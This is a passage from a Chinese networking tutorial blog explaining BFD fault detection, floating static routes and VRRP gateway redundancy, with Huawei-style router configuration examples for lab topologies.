title="现网中存在的问题"></a>现网中存在的问题</h3><p><strong>现网中存在的问题</strong></p><ul><li>网络应用的广泛部署，网络发生故障导致企业业务长时间中断</li><li>如何快速有效的发现网络设备或链路出现的故障</li><li>如何以毫秒级的速度发现网络问题</li><li>如何及时发现问题，解决问题，保障网络的可靠性</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>BFD（Bidirectional Forwarding Detection）</strong></p><ul><li>双向转发检测</li><li>BFD提供了一个通用的、标准化的、介质无关的、协议无关的快速故障检测机制</li></ul><p><strong>BFD的作用</strong></p><ul><li>专门用于发送超小和超快的检测数据包，以毫秒级进行发送，快速检测链路的故障，改善网络性能</li><li>当发现链路故障时，通知相关的设备和协议进行处理，快速恢复通信，保证网络可靠性</li></ul><h3 id="BFD原理描述"><a href="#BFD原理描述" class="headerlink" title="BFD原理描述"></a>BFD原理描述</h3><p><strong>原理简介</strong></p><ul><li>BFD在两台网络设备上建立会话</li><li>会话建立后会周期性地快速发送BFD报文，用来检测链路状态</li><li>如果在检测时间内没有收到BFD报文则认为链路发生故障，通知上层应用进行处理</li></ul><h3 id="BFD会话建立方式"><a href="#BFD会话建立方式" class="headerlink" title="BFD会话建立方式"></a>BFD会话建立方式</h3><p><strong>BFD会话建立有两种方式</strong></p><ul><li>静态建立</li><li>动态建立</li><li>静态和动态的主要区别：本地标识符和远端标识符配置方式不同</li></ul><p><strong>静态建立</strong></p><ul><li>手工配置BFD会话参数（手工配置：本地标识符和远端标识符）</li></ul><p><strong>动态建立</strong></p><ul><li>动态分配本地标识符、自动学习远端标识符</li></ul><h3 id="BFD检测机制"><a href="#BFD检测机制" class="headerlink" title="BFD检测机制"></a>BFD检测机制</h3><p><strong>BFD检测机制</strong></p><ul><li>两个设备建立BFD会话，链路两端周期性发送BFD控制报文</li><li>如果一端在既定的时间内没有收到报文，则认为路径上发生了故障</li></ul><p><img src="/../img/img_artical/net_sec/5.2.2.png" alt="5.2.2"></p><h3 id="BFD会话常见参数的缺省配置"><a href="#BFD会话常见参数的缺省配置" class="headerlink" title="BFD会话常见参数的缺省配置"></a>BFD会话常见参数的缺省配置</h3><table><thead><tr><th align="center">参数</th><th align="center">缺省值</th></tr></thead><tbody><tr><td align="center">发送间隔</td><td align="center">1000毫秒</td></tr><tr><td align="center">接收间隔</td><td align="center">1000毫秒</td></tr><tr><td align="center">本地检测倍数</td><td align="center">3</td></tr></tbody></table><h2 id="BFD与静态路由联动"><a href="#BFD与静态路由联动" class="headerlink" title="BFD与静态路由联动"></a>BFD与静态路由联动</h2><h3 id="BFD与静态路由联动-1"><a href="#BFD与静态路由联动-1" class="headerlink" title="BFD与静态路由联动"></a>BFD与静态路由联动</h3><p><img src="/../img/img_artical/net_sec/5.2.3.png" alt="5.2.3"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">配置BFD</span></span><br><span class="line"><span class="attr">[R1]bfd</span>                                         <span class="string">//启用BFD</span></span><br><span class="line"><span class="attr">[R1-bfd]quit</span></span><br><span class="line"><span class="attr">[R1]bfd</span> <span class="string">ntd bind peer-id 192.168.24.4           //创建bfd会话，名字为ntd，绑定对端端口ID</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]discriminator</span> <span class="string">local 1       //配置本端设备标识为1</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]discriminator</span> <span class="string">remote 4      //配置远端设备标识为4</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]commit</span>                      <span class="string">//提交BFD会话，让配置生效</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R4]bfd</span>                                         <span class="string">//启用BFD</span></span><br><span class="line"><span class="attr">[R4-bfd]quit</span></span><br><span class="line"><span class="attr">[R4]bfd</span> <span class="string">ntd bind peer-id 192.168.12.1           //创建bfd会话，名字为ntd，绑定对端端口ID</span></span><br><span class="line"><span class="attr">[R4-bfd-session-ntd]discriminator</span> <span class="string">local 4       //配置本端设备标识为4</span></span><br><span class="line"><span class="attr">[R4-bfd-session-ntd]discriminator</span> <span class="string">remote 1      //配置远端设备标识为1</span></span><br><span class="line"><span class="attr">[R4-bfd-session-ntd]commit</span>                      <span class="string">//提交BFD会话，让配置生效</span></span><br><span class="line"></span><br><span class="line"><span class="attr">配置浮动路由</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.2.0 24 192.168.12.2</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.2.0 24 192.168.13.3 preference 70</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.34.0 24  192.168.12.2 </span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.12.1</span></span><br><span class="line"><span class="attr">[R2]ip</span> <span class="string">route-static 192.168.2.0 24 192.168.24.4</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.13.1</span></span><br><span class="line"><span class="attr">[R3]ip</span> <span class="string">route-static 192.168.2.0 24 192.168.34.4</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R4]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.24.2 </span></span><br><span class="line"><span class="attr">[R4]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.34.3 preference 70</span></span><br><span class="line"><span class="attr">[R4]ip</span> <span class="string">route-static 192.168.13.0 24 192.168.24.2 </span></span><br><span class="line"></span><br><span class="line"><span class="attr">配置BFD和静态路由联动</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.2.0 24 192.168.12.2 track bfd-session ntd        //当BFD检测到指定链路不通时，从路由表中删除该静态路由</span></span><br><span class="line"><span class="attr">[R4]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.24.2 track bfd-session ntd        //当BFD检测到指定链路不通时，从路由表中删除该静态路由</span></span><br></pre></td></tr></table></figure><h2 id="BFD与VRRP联动"><a href="#BFD与VRRP联动" class="headerlink" title="BFD与VRRP联动"></a>BFD与VRRP联动</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>R1故障，R2切换为主网关</li><li>默认切换时间为3s</li><li>希望主&#x2F;备网关实现快速切换</li></ul><p><img src="/../img/img_artical/net_sec/5.2.4.png" alt="5.2.4"></p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>实现主备角色快速切换</strong></p><ul><li>在R1和R2之间，建立BFD会话</li><li>在R2上配置VRRP链路追踪，跟踪对象为BFD会话</li><li>一旦BFD会话的状态为down，则增加R2的优先级，确保R2升级为主路由器</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><strong>在R1和R2之间建立BFD会话</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]bfd</span>                                         <span class="string">//启用BFD</span></span><br><span class="line"><span class="attr">[R1-bfd]quit</span></span><br><span class="line"><span class="attr">[R1]bfd</span> <span class="string">ntd bind peer-id 192.168.1.252          //创建bfd会话，名字为ntd，绑定对端端口ID</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]discriminator</span> <span class="string">local 1       //配置本端设备标识为1</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]discriminator</span> <span class="string">remote 4      //配置远端设备标识为4</span></span><br><span class="line"><span class="attr">[R1-bfd-session-ntd]commit</span>                      <span class="string">//提交BFD会话，让配置生效</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]bfd</span>                                         <span class="string">//启用BFD</span></span><br><span class="line"><span class="attr">[R2-bfd]quit</span></span><br><span class="line"><span class="attr">[R2]bfd</span> <span class="string">ntd bind peer-id 192.168.1.251          //创建bfd会话，名字为ntd，绑定对端端口ID</span></span><br><span class="line"><span class="attr">[R2-bfd-session-ntd]discriminator</span> <span class="string">local 4       //配置本端设备标识为4</span></span><br><span class="line"><span class="attr">[R2-bfd-session-ntd]discriminator</span> <span class="string">remote 1      //配置远端设备标识为1</span></span><br><span class="line"><span class="attr">[R2-bfd-session-ntd]commit</span>                      <span class="string">//提交BFD会话，让配置生效</span></span><br></pre></td></tr></table></figure><p><strong>在R2上配置VRRP链路追踪，跟踪BFD会话</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]interface</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R2-G0/0/0]vrrp</span> <span class="string">vrid 1 track bfd-session 2 increased 110   //如果BFD会话断开，那么R2的优先级增加110</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网实现与安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网实现与安全1</title>
      <link href="/posts/campus1.html"/>
      <url>/posts/campus1.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网实现与安全"><a href="#园区网实现与安全" class="headerlink" title="园区网实现与安全"></a>园区网实现与安全</h1><h2 id="浮动路由"><a href="#浮动路由" class="headerlink" title="浮动路由"></a>浮动路由</h2><h3 id="网络经典故障"><a href="#网络经典故障" class="headerlink" title="网络经典故障"></a>网络经典故障</h3><p><strong>单路径故障</strong></p><ul><li>通信终端之间仅仅存在一个转发路径</li></ul><p><strong>单路径风险</strong></p><ul><li>当这条唯一的路径出现故障，终端之间的通信都会彻底中断</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>冗余路径</strong></p><ul><li>在互联设备之间增加一条冗余路径，实现备份作用</li></ul><h3 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h3><p><strong>浮动路由</strong></p><ul><li><p>浮动路由又称为路由备份，由两条或多条链路组成浮动路由</p></li><li><p>浮动路由指配置两条静态路由，这两条静态路由的目的地址相同，但是下一跳不同</p></li><li><p>给这两条静态路由设置不同优先级，优先级高的那条静态路由作为主链路，优先级低的那条静态路由作为备份链路</p></li><li><p>也叫浮动静态路由，是一种特殊的静态路由，用于提供一种备份路径</p></li><li><p>当主路径出现故障时，备份路径就会启动，保持网络的连通性</p></li><li><p>配置完浮动路由后，备份链路不进入路由表，只有当主链路出现故障时，备份链路才进入路由表</p></li><li><p>当主链路故障恢复后，主链路进入路由表，承担数据转发任务，备份链路变为不可用状态，移出路由表</p></li></ul><p><strong>浮动路由的作用</strong></p><ul><li>预防单路径故障，保持网络的不中断</li></ul><p><strong>浮动路由的特点</strong></p><ul><li>浮动路由在同一时刻，数据只会由一条路径进行转发</li></ul><p><strong>浮动路由优先级</strong></p><ul><li>当去往同一个目的地有多条路由时，为了判断最优路由，各路由协议（包括静态路由）都被赋予了一个优先级</li><li>优先级高的路由会成为最优路由，路由器会将最优路由条目放入本地IP核心路由表中</li><li>路由优先级：优先级用数值表示，数值越小优先级越高</li></ul><table><thead><tr><th align="center">路由类别</th><th align="center">路由优先级</th></tr></thead><tbody><tr><td align="center">Direct：直连路由</td><td align="center">0</td></tr><tr><td align="center">Static：静态路由</td><td align="center">60</td></tr></tbody></table><h3 id="浮动路由配置命令"><a href="#浮动路由配置命令" class="headerlink" title="浮动路由配置命令"></a>浮动路由配置命令</h3><p><img src="/../img/img_artical/net_sec/5.1.1.png" alt="5.1.1"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.4.0 24 192.168.2.2</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.4.0 24 192.168.3.2 preference 70</span></span><br></pre></td></tr></table></figure><h3 id="浮动路由实验"><a href="#浮动路由实验" class="headerlink" title="浮动路由实验"></a>浮动路由实验</h3><p><strong>拓扑</strong></p><p><img src="/../img/img_artical/net_sec/5.1.2.png" alt="5.1.2"></p><p><strong>需求：配置浮动路由，实现链路冗余</strong></p><p><strong>步骤：</strong></p><ul><li><p>第一步：配置PC的IP地址，子网掩码，网关</p></li><li><p>第二步：交换机配置VLAN，接口加入指定VLAN</p><ul><li><p>SW1交换机创建VLAN10</p></li><li><p>SW1交换机的所有接口都设置为Access模式，并加入VLAN10</p></li><li><p>SW2交换机创建VLAN40</p></li><li><p>SW2交换机的所有接口都设置为Access模式，并加入VLAN40</p></li></ul></li><li><p>第三步：路由器配置接口IP地址</p></li><li><p>第四步：路由器配置浮动路由</p><ul><li><p>配置192.168.3.0&#x2F;24为备份链路，指定路由优先级为70</p></li><li><p>配置192.168.2.0&#x2F;24为主链路，静态路由默认优先级为60</p></li></ul></li><li><p>第五步：验证与测试</p><ul><li><p>验证是否主链路转发数据</p></li><li><p>验证是否主链路路由进入路由表</p></li><li><p>让主链路出现故障，验证备份路由是否起作用</p></li><li><p>恢复主链路，验证主链路是否重新取代备份链路进行工作</p></li></ul></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">配置命令：</span></span><br><span class="line"><span class="attr">第一步：配置PC的IP地址，子网掩码，网关</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第二步：交换机配置VLAN，接口加入指定VLAN</span></span><br><span class="line"><span class="attr">1）SW1交换机创建VLAN10</span></span><br><span class="line"><span class="attr">2）SW1交换机的所有接口都设置为Access模式，并加入VLAN10</span></span><br><span class="line"><span class="attr">3）SW2交换机创建VLAN40</span></span><br><span class="line"><span class="attr">4）SW2交换机的所有接口都设置为Access模式，并加入VLAN40</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW1]vlan</span> <span class="string">10</span></span><br><span class="line"><span class="attr">[SW1]quit</span></span><br><span class="line"><span class="attr">[SW1]port-group</span> <span class="string">proup-member GigabitEthernet0/0/1 to GigabitEthernet0/0/3</span></span><br><span class="line"><span class="attr">[SW1-port-group]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW1-port-group]port</span> <span class="string">default vlan 10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW2]vlan</span> <span class="string">40</span></span><br><span class="line"><span class="attr">[SW2]quit</span></span><br><span class="line"><span class="attr">[SW2]port-group</span> <span class="string">proup-member GigabitEthernet0/0/1 to GigabitEthernet0/0/2</span></span><br><span class="line"><span class="attr">[SW2-port-group]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW2-port-group]port</span> <span class="string">default vlan 40</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第三步：路由器配置接口IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.254 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]interface</span> <span class="string">GigabitEthernet0/0/1</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/1]ip</span> <span class="string">address 192.168.2.1 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/1]interface</span> <span class="string">GigabitEthernet0/0/2</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/2]ip</span> <span class="string">address 192.168.3.1 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.4.254 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]interface</span> <span class="string">GigabitEthernet0/0/1</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]ip</span> <span class="string">address 192.168.2.2 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]interface</span> <span class="string">GigabitEthernet0/0/2</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/2]ip</span> <span class="string">address 192.168.3.2 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第四步：路由器配置浮动路由</span></span><br><span class="line"><span class="attr">1）配置192.168.3.0/24为备份链路，指定路由优先级为70</span></span><br><span class="line"><span class="attr">2）配置192.168.4.0/24为主链路，静态路由默认优先级为60</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.4.0 24 192.168.3.2 preference 70</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.4.0 24 192.168.2.2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.3.1 preference 70</span></span><br><span class="line"><span class="attr">[R2]ip</span> <span class="string">route-static 192.168.1.0 24 192.168.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">第五步：验证与测试</span></span><br><span class="line"><span class="attr">1）验证是否主链路转发数据</span></span><br><span class="line"><span class="attr">2）验证是否主链路路由进入路由表</span></span><br><span class="line"><span class="attr">3）让主链路出现故障，验证备份路由是否起作用</span></span><br><span class="line"><span class="attr">4）恢复主链路，验证主链路是否重新取代备份链路进行工作</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]display</span> <span class="string">ip routing-table</span></span><br><span class="line"><span class="attr">[R1]display</span> <span class="string">ip routing-table 192.168.4.3</span></span><br><span class="line"></span><br><span class="line"><span class="attr">备注：shutdown掉R1的g0/0/1</span> <span class="string">让主链路故障</span></span><br><span class="line"><span class="attr">验证备份链路是否工作</span></span><br></pre></td></tr></table></figure><h2 id="VRRP基本概念"><a href="#VRRP基本概念" class="headerlink" title="VRRP基本概念"></a>VRRP基本概念</h2><h3 id="网络经典故障-1"><a href="#网络经典故障-1" class="headerlink" title="网络经典故障"></a>网络经典故障</h3><p><strong>单网关面临的问题</strong></p><ul><li>当网关故障后，网段中的主机无法上网</li></ul><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>通过部署多网关的方式实现网关备份</strong></p><p><strong>存在的问题</strong></p><ul><li>如何定义主机的网关地址</li></ul><h3 id="技术实现-1"><a href="#技术实现-1" class="headerlink" title="技术实现"></a>技术实现</h3><p><strong>VRRP</strong></p><ul><li>把多台路由设备联合组成一台虚拟的路由器配置一个虚拟网关IP地址</li><li>虚拟网关IP作为主机的网关，实现网关的备份</li></ul><h3 id="VRRP概述"><a href="#VRRP概述" class="headerlink" title="VRRP概述"></a>VRRP概述</h3><p><strong>VRRP协议</strong></p><ul><li>Virtual Router Redundancy Protocol，虚拟路由冗余协议</li><li>由IETF标准RFC2338定义，是公有标准协议，任何厂商设备都支持</li><li>VRRP协议位于OSI模型第三层，协议号为112</li><li>VRRP发送报文的方式为组播，地址为224.0.0.18</li></ul><p><strong>VRRP 的作用</strong></p><ul><li>实现多个真实网关的冗余备份</li><li>实现数据转发的负载均衡</li></ul><p><strong>VRRP组成员角色</strong></p><ul><li>主路由器：Master  →  负责承担数据报文转发任务</li><li>备份路由器：Backup  →  负责监控主路由器状态</li><li>虚拟路由器 ：Virtual → ⼜称 VRRP 备份组，虚拟路由器的 IP 地址作为局域网中主机的默认网关</li></ul><p><strong>VRRP主备角色选择原则</strong></p><ul><li>首先比较优先级，优先级大的为 master</li><li>如果优先级⼀致，其次比较 IP 地址，IP 地址⼤的为 master （模拟器⽆法模拟）</li></ul><p><strong>VRRP须知</strong></p><ul><li>在⼀个 VRRP 备份组中，Master 设备有且仅有⼀个</li><li>VRRP 协议包括两个版本：VRRPv2 和 VRRPv3</li><li>VRRPv2 仅适用于 IPv4 网络，VRRPv3 适用于 IPv4 和 IPv6 两种网络</li><li>VRRP 协议报文封装在 IP 报头的后面，协议号是 112</li><li>VRRP 通告报⽂源地址为主路由器物理接⼝的 IP 地址（不是虚拟 IP 地址），⽬的地址是 224.0.0.18</li></ul><h3 id="VRRP基本概念-1"><a href="#VRRP基本概念-1" class="headerlink" title="VRRP基本概念"></a>VRRP基本概念</h3><p><strong>VRRP路由器</strong></p><ul><li>运行VRRP协议的路由器称为VRRP路由器</li><li>VRRP是配置在路由器的接口上，而且也是基于接口工作的</li></ul><p><strong>VRID：Virtual Router Identifier（虚拟路由标识符）</strong></p><ul><li><p>又称备份组组号</p></li><li><p>一个VRRP组由多台路由器（的接口）组成，用相同的VRID进行表示</p></li><li><p>同一个VRRP组的路由器之间交互VRRP协议报文产生一台虚拟路由器</p></li><li><p>一个VRRP组中只能出现一台Master路由器</p></li></ul><p><strong>虚拟路由器</strong></p><ul><li><p>又称VRRP备份组</p></li><li><p>每一个VRRP组中都产生一台虚拟路由器（Virture Router），该路由器并非真实存在的物理设备，而是由VRRP虚拟出来的逻辑设备</p></li><li><p>一个VRRP组只产生一台虚拟路由器</p></li></ul><p><strong>虚拟IP地址及虚拟MAC地址</strong></p><ul><li><p>虚拟路由器拥有IP地址和MAC地址</p></li><li><p>其中IP地址由管理员配置VRRP时指定</p></li><li><p>虚拟IP地址通常作为用户主机的网关地址</p></li><li><p>虚拟MAC地址根据虚拟路由器 VRID 生成的，一个虚拟路由器拥有⼀个虚拟 MAC 地址</p><p>如果 VRID 是 1： 虚拟 MAC 地址就是： 00-00-5E-00-01-01</p><p>如果 VRID 是 5： 虚拟 MAC 地址就是： 00-00-5E-00-01-05</p></li></ul><p><strong>Master路由器</strong></p><ul><li>也被称为主路由器</li><li>负责转发用户上网数据</li><li>Master路由器会周期性地发送VRRP报文，用于通知同一个VRRP组中的Backup路由器关于自己的存活状态</li></ul><p><strong>Backup路由器</strong></p><ul><li>也被称为备份路由器</li><li>负责监控主路由器状态，事实监听Master路由器发出来的VRRP报文</li><li>当Master路由器故障时，Backup路由器会接替Master路由器的工作，称为新的Master路由器，负责转发用户的上网数据</li></ul><p><strong>Priority</strong></p><ul><li>优先级值</li><li>用来选举Master路由器</li><li>数值越大越优先，默认100，取值范围为0~255</li><li>如果优先级值相等则比较接口IP地址大小，IP地址越大越优先</li></ul><h3 id="VRRP协议报文"><a href="#VRRP协议报文" class="headerlink" title="VRRP协议报文"></a>VRRP协议报文</h3><p><strong>VRRP协议报文</strong></p><ul><li>VRRP协议报文基于组播方式发送，只能在同一个广播域传递</li><li>VRRP协议报文的目的组播地址为224.0.0.18</li><li>VRRP协议封装在IP报头后面，协议号为112</li></ul><p><img src="/../img/img_artical/net_sec/5.1.3.png" alt="5.1.3"></p><h2 id="VRRP主备切换"><a href="#VRRP主备切换" class="headerlink" title="VRRP主备切换"></a>VRRP主备切换</h2><h3 id="VRRP主备选举"><a href="#VRRP主备选举" class="headerlink" title="VRRP主备选举"></a>VRRP主备选举</h3><p><strong>VRRP协议状态机</strong></p><ul><li>Initialize（初始状态）</li><li>Master（活动状态）</li><li>Backup（备份状态）</li></ul><h3 id="VRRP主备选举-1"><a href="#VRRP主备选举-1" class="headerlink" title="VRRP主备选举"></a>VRRP主备选举</h3><p><strong>VRRP主备选举</strong></p><ul><li>配置完VRRP的设备初始时默认Initialize状态</li><li>若设备优先级小于255，则会先切换至Backup状态，然后再切换至Master状态</li><li>R1和R2通过相互发送VRRP报文进行Master选举</li><li>R1优先级为200，R2优先级为100，则R1被选为Master路由器</li><li>R1被选举为Master路由器后，立即发送免费ARP报文将虚拟MAC地址通告给与它连接的设备和主机</li></ul><h3 id="VRRP主备切换-1"><a href="#VRRP主备切换-1" class="headerlink" title="VRRP主备切换"></a>VRRP主备切换</h3><p><strong>VRRP主备切换–R1主动退出VRRP组</strong></p><ul><li>R1主动退出VRRP组，如删除VRRP配置</li><li>R1发送优先级为0的报文</li><li>R2成为新的Master</li><li>切换时间为偏移时间</li></ul><p><img src="/../img/img_artical/net_sec/5.1.4.png" alt="5.1.4"></p><p><strong>VRRP主备切换–R1设备故障</strong></p><ul><li>R1设备故障，无法发送报文</li><li>R2等待定时器超时</li><li>R2称为新的Master</li></ul><p><img src="/../img/img_artical/net_sec/5.1.5.png" alt="5.1.5"></p><p><strong>VRRP的两个定时器</strong></p><ul><li>ADVER_INTERVAL定时器：Master发送VRRP通告报文时间周期，默认1s</li><li>MASTER_DOWN定时器：Backup设备监听该定时器超时后，成为Master设备</li><li>MASTER_DOWN定时器计算公式如下</li></ul><p>​MASTER_DOWN&#x3D;(3*ADVER_INTERVAL)+Skew_time（便宜时间）</p><p>​其中Skew_time&#x3D;（256-Priority）&#x2F;256</p><h3 id="VRRP主备回切"><a href="#VRRP主备回切" class="headerlink" title="VRRP主备回切"></a>VRRP主备回切</h3><p><strong>VRRP主备回切</strong></p><ul><li>R1从故障恢复后，重新进行主备选举</li><li>R1优先级为130大于R2</li><li>且R1开启了抢占模式</li><li>R1重新成为Master设备</li></ul><p><img src="/../img/img_artical/net_sec/5.1.6.png" alt="5.1.6"></p><p><strong>VRRP抢占模式</strong></p><ul><li>抢占模式（默认开启）：如果Backup路由器开启了抢占功能，那么当他发现Master路由器的优先级比自己更低时，它将立即切换至Master状态，成为新的Master设备</li><li>非抢占模式：如果Backup路由器没有开启抢占功能，那么即时他发现Master路由器的优先级比自己更低，也只能保持Backup状态</li></ul><h3 id="VRRP工作原理"><a href="#VRRP工作原理" class="headerlink" title="VRRP工作原理"></a>VRRP工作原理</h3><p><strong>VRRP工作过程</strong></p><ul><li><p>VRRP备份组中的设备根据优先级选举出Master-主路由器</p></li><li><p>主路由器发送免费ARP报文，将虚拟MAC地址通知给与它连接的设备，承担数据转发任务</p></li><li><p>主路由器，周期性发送VRRP通告报文（三层心跳报文）</p></li><li><p>通告报文发送周期时间：默认为1s</p></li><li><p>通告报文发送的目的地址是组播地址：224.0.0.18</p></li><li><p>备份路由器，监控主路由器状态，在3倍的发送周期后，如果无法收到主路由器发送的VRRP通告报文，备份路由器升级为主路由器承担流量发送任务，新的主路由器会立即发送免费 ARP 报文，刷新与它连接设备中的 MAC 表项，从而把⽤户流量引到新的 Master 设备上来</p></li><li><p>原主路由器故障恢复时，⾸先切换至 Backup 状态：</p><p>如果原 Master 已开启抢占模式，并且对比优先级，发现⾃⼰的优先级⾼，则主动将自己切换成 Master。</p><p>如果原 Master 没有开启抢占模式，即便优先级⾼，也不会进⾏抢占，依然保持 Backup 状态</p></li></ul><h2 id="VRRP配置"><a href="#VRRP配置" class="headerlink" title="VRRP配置"></a>VRRP配置</h2><h3 id="VRRP配置命令"><a href="#VRRP配置命令" class="headerlink" title="VRRP配置命令"></a>VRRP配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.251 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 virtual-ip 192.168.1.254     //配置VRRP虚拟网关地址</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 priority 130                 //配置VRRP优先级</span></span><br><span class="line"></span><br><span class="line"><span 